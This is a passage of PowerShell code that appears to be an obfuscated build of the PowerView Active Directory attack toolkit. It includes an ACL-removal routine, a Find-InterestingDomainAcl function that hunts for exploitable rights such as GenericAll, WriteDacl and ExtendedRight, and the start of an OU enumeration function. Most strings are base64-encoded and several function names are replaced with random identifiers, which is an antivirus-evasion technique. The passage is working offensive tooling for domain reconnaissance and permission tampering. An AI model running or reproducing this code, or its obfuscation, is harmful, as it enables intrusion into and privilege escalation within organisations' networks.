                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${191b6bf4cb0b4919aff9170fb656ee7e}.objectsid)
                    if (${4ec6a424a697407eb189b374cdcb24a9}) {
                        ForEach (${1df2c267ee6946f9b59b0dae3e08f61c} in ${4ec6a424a697407eb189b374cdcb24a9}) {
                            ${bf1d498483c849ffb6993746356cb07d} = New-Object Guid ${1df2c267ee6946f9b59b0dae3e08f61c}
                            ${a1ddb908d9ac49619c3f8d25d1bb9442} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            ${3d7a85a9f6a64b37a1c49dcec29e8b63} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${a1ddb908d9ac49619c3f8d25d1bb9442}, ${012ef5b9a0ab4c69918700d49b643059}, ${bf1d498483c849ffb6993746356cb07d}, $InheritanceType
                        }
                    }
                    else {
                        ${a1ddb908d9ac49619c3f8d25d1bb9442} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        ${3d7a85a9f6a64b37a1c49dcec29e8b63} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${a1ddb908d9ac49619c3f8d25d1bb9442}, ${012ef5b9a0ab4c69918700d49b643059}, $InheritanceType
                    }
                    ForEach (${47c4a24caf944caa9c5108ae65d7de9d} in ${3d7a85a9f6a64b37a1c49dcec29e8b63}) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $(${191b6bf4cb0b4919aff9170fb656ee7e}.distinguishedname) rights GUID '$(${47c4a24caf944caa9c5108ae65d7de9d}.ObjectType)' on $(${cc2d6cd9e888461983c61e2d23cb76d9}.Properties.distinguishedname)"
                        ${e3d605e4f7a74c479e4d09ea708505e6} = ${cc2d6cd9e888461983c61e2d23cb76d9}.GetDirectoryEntry()
                        ${e3d605e4f7a74c479e4d09ea708505e6}.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
                        ${e3d605e4f7a74c479e4d09ea708505e6}.PsBase.ObjectSecurity.RemoveAccessRule(${47c4a24caf944caa9c5108ae65d7de9d})
                        ${e3d605e4f7a74c479e4d09ea708505e6}.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $(${191b6bf4cb0b4919aff9170fb656ee7e}.distinguishedname) '$Rights' from $(${cc2d6cd9e888461983c61e2d23cb76d9}.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function Find-InterestingDomainAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $Domain,
        [Switch]
        $ResolveGUIDs,
        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${916c7d6c5d224db9aaf93ec0ce059e19} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))] = $ResolveGUIDs }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))] = $RightsFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${26d3a3ae11e14d75a68b54a6ec5958fa} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbwBiAGoAZQBjAHQAYwBsAGEAcwBzAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${26d3a3ae11e14d75a68b54a6ec5958fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${26d3a3ae11e14d75a68b54a6ec5958fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${26d3a3ae11e14d75a68b54a6ec5958fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${26d3a3ae11e14d75a68b54a6ec5958fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${26d3a3ae11e14d75a68b54a6ec5958fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${26d3a3ae11e14d75a68b54a6ec5958fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${b36bf00903c14682a2e243a875596f28} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${b36bf00903c14682a2e243a875596f28}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${b36bf00903c14682a2e243a875596f28}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${260e04cd02e44507a31244cc468ac297} = @{}
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            ${b36bf00903c14682a2e243a875596f28}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
        }
        ec0cbdfd08d5425a85d28477162ec2fb @916c7d6c5d224db9aaf93ec0ce059e19 | ForEach-Object {
            if ( ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAB8AFcAcgBpAHQAZQB8AEMAcgBlAGEAdABlAHwARABlAGwAZQB0AGUA')))) -or (($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))) -and ($_.AceQualifier -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))))) {
                if ($_.SecurityIdentifier.Value -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAuACoALQBbADEALQA5AF0AXABkAHsAMwAsAH0AJAA=')))) {
                    if (${260e04cd02e44507a31244cc468ac297}[$_.SecurityIdentifier.Value]) {
                        ${861e113617324cb285e80efff8c7b028}, ${6846bd9dd55f4b17be75bf3858365ebc}, ${ceaf4317c1b04231808a94cba6498c94}, ${a32602132ebb4aa6ad2d7645da01d8d6} = ${260e04cd02e44507a31244cc468ac297}[$_.SecurityIdentifier.Value]
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2} = New-Object PSObject
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $_.ObjectDN
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUQB1AGEAbABpAGYAaQBlAHIA'))) $_.AceQualifier
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $_.ObjectAceType
                        }
                        else {
                            ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                        }
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))) $_.AceFlags
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))) $_.AceType
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABhAG4AYwBlAEYAbABhAGcAcwA='))) $_.InheritanceFlags
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIA'))) $_.SecurityIdentifier
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAE4AYQBtAGUA'))) ${861e113617324cb285e80efff8c7b028}
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQAbwBtAGEAaQBuAA=='))) ${6846bd9dd55f4b17be75bf3858365ebc}
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQATgA='))) ${ceaf4317c1b04231808a94cba6498c94}
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEMAbABhAHMAcwA='))) ${a32602132ebb4aa6ad2d7645da01d8d6}
                        ${8d35ed8b4cca418a8eb5d8cc94167bd2}
                    }
                    else {
                        ${ceaf4317c1b04231808a94cba6498c94} = a4ad8c5db2444528bab99963038ffd7c -Identity $_.SecurityIdentifier.Value -d6f8ca3d1c994c23b84c147c1aa4c2c9 DN @b36bf00903c14682a2e243a875596f28
                        if (${ceaf4317c1b04231808a94cba6498c94}) {
                            ${6846bd9dd55f4b17be75bf3858365ebc} = ${ceaf4317c1b04231808a94cba6498c94}.SubString(${ceaf4317c1b04231808a94cba6498c94}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            ${26d3a3ae11e14d75a68b54a6ec5958fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${6846bd9dd55f4b17be75bf3858365ebc}
                            ${26d3a3ae11e14d75a68b54a6ec5958fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${ceaf4317c1b04231808a94cba6498c94}
                            $Object = dc2f41a670d5455b8f64f106e1b09449 @26d3a3ae11e14d75a68b54a6ec5958fa
                            if ($Object) {
                                ${861e113617324cb285e80efff8c7b028} = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))) {
                                    ${a32602132ebb4aa6ad2d7645da01d8d6} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))
                                }
                                elseif ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))) {
                                    ${a32602132ebb4aa6ad2d7645da01d8d6} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                                }
                                elseif ($Object.Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))) {
                                    ${a32602132ebb4aa6ad2d7645da01d8d6} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                                }
                                else {
                                    ${a32602132ebb4aa6ad2d7645da01d8d6} = $Null
                                }
                                ${260e04cd02e44507a31244cc468ac297}[$_.SecurityIdentifier.Value] = ${861e113617324cb285e80efff8c7b028}, ${6846bd9dd55f4b17be75bf3858365ebc}, ${ceaf4317c1b04231808a94cba6498c94}, ${a32602132ebb4aa6ad2d7645da01d8d6}
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2} = New-Object PSObject
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $_.ObjectDN
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUQB1AGEAbABpAGYAaQBlAHIA'))) $_.AceQualifier
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $_.ObjectAceType
                                }
                                else {
                                    ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                                }
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))) $_.AceFlags
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))) $_.AceType
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABhAG4AYwBlAEYAbABhAGcAcwA='))) $_.InheritanceFlags
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIA'))) $_.SecurityIdentifier
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAE4AYQBtAGUA'))) ${861e113617324cb285e80efff8c7b028}
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQAbwBtAGEAaQBuAA=='))) ${6846bd9dd55f4b17be75bf3858365ebc}
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEQATgA='))) ${ceaf4317c1b04231808a94cba6498c94}
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAEMAbABhAHMAcwA='))) ${a32602132ebb4aa6ad2d7645da01d8d6}
                                ${8d35ed8b4cca418a8eb5d8cc94167bd2}
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}
function a441e23e2e174a0185672157e28acb2c {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        ${e9af060612154816abf90079d611af3a},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${7584c870544f4d57b8bf0299151060ee} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
    }
    PROCESS {
        if (${7584c870544f4d57b8bf0299151060ee}) {
            ${fb29aaa2f9c140909efae41cb42f1bef} = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                ${56aaa31f880a49e195bcf739ac331528} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBPAFUAPQAuACoA')))) {
                    ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${7eef0517afe94597af8ab4be39a72451} = ${56aaa31f880a49e195bcf739ac331528}.SubString(${56aaa31f880a49e195bcf739ac331528}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
